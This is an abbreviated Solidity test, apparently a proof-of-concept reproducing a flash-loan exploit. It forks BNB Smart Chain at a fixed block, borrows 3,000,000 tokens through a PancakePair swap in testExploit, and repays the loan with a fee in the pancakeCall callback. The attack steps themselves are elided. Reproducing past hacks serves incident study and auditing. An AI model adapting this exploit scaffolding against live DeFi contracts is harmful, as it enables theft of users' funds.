...
contract ContractTest is DSTest {
    ...
    function setUp() public {
        cheats.createSelectFork("bsc", 21055930); //fork bsc at block number 21055930
    }
    ...
    function testExploit() public {
        ...
        PancakePair.swap(3000000000000000000000000, 0, address(this), new bytes(1));
    ...
    function pancakeCall(
        ...
        //Repay flashloan
        Usdt.transfer(address(PancakePair), (ba * 10030) / 10000);
